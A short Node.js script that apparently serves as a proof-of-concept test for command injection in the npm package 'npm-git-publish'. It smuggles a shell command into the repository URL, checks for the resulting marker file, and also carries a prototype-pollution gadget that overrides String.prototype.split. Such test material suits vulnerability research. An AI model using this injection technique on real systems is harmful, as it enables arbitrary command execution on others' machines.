var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const git = require('npm-git-publish');
const fs = require('fs');
const path = './npm-git-publish';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
console.log(git.publish('./', 'http://gihub.com & echo injected > npm-git-publish; #').catch(() => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.rmSync('./gihub.com', {
        recursive: true,
        force: true
    });
    fs.unlink(path, function (err) {
    });
}));